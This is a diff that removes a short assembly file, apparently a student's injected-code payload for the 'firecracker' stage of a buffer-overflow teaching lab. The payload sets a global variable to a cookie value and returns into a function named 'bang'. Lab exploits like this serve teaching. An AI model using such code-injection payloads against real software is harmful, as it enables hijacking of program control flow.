@@ -1,5 +1,0 @@
-#this is my exploit code for the firecracker stage
-
-	movl $0x35c4d934, %eax	#set global_value = cookie
-	push $0x08048c52	#push address of bang onto stack
-	ret
